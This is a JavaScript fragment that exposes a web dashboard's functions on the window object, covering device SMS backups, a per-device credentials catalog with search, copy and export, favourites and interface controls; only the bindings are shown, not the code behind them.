window.deleteDeviceSms = deleteDeviceSms;
window.filterSmsByDevice = filterSmsByDevice;
window.clearSmsFilter = clearSmsFilter;
window.triggerBackup = triggerBackup;
window.refreshBackupStatus = refreshBackupStatus;
window.clearBackupStatus = clearBackupStatus;
window.openBackupSmsModal = openBackupSmsModal;
window.closeBackupSmsModal = closeBackupSmsModal;
window.refreshDeviceBackup = refreshDeviceBackup;
window.scrollCredentialsToBottom = scrollCredentialsToBottom;
window.scrollCredentialsToTop = scrollCredentialsToTop;
window.performRender = performRender;
window.toggleFabMenu = toggleFabMenu;
window.scrollToTop = scrollToTop;
window.openBottomSheet = openBottomSheet;
window.closeBottomSheet = closeBottomSheet;
window.showDeviceInBottomSheet = showDeviceInBottomSheet;
window.filterCreds = filterCreds;
window.filterCredsByDevice = filterCredsByDevice;
window.searchCredentials = searchCredentials;
window.credGoToPage = credGoToPage;
window.copyAllCreds = copyAllCreds;
window.deleteSingleCred = deleteSingleCred;
window.exportCredentials = exportCredentials;
window.renderCredentialsCatalog = renderCredentialsCatalog;
window.toggleFavourite = toggleFavourite;
window.isFavourite = isFavourite;
window.clearAllFavourites = clearAllFavourites;
window.renderFavouritesCatalog = renderFavouritesCatalog;
window.loadFavourites = loadFavourites;
window.updateFavCounts = updateFavCounts;
window.updateDeviceFavStars = updateDeviceFavStars;